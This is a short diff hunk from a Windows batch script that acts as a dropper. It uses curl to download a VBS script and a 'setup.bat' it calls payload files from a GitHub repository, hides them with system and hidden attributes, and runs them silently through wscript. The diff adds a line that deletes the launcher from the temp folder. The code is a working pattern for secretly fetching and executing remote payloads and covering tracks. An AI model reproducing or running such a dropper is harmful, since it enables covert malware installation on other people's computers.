@@ -42,16 +42,17 @@ curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs -
 
 attrib +h +s "%hiddenFolder1%\myscript.vbs"
 
-set "thetime=%time%"
-
 REM Download payload files to hidden folder using curl
 curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/setup.bat -o "%hiddenFolder1%\setup.bat"
-REM Set hidden attribute for file
 
+REM Set hidden attribute for file
 attrib +h +s "%hiddenFolder1%\setup.bat"
 
 REM Run payload silently and pass %hiddenFolder% variable
-start /B wscript.exe myscript.vbs setup.bat %hiddenFolder1% >> nul
+start /B wscript.exe myscript.vbs setup.bat
+
+del "%temp%\startup.bat"
+
 goto :eof
 
 :end
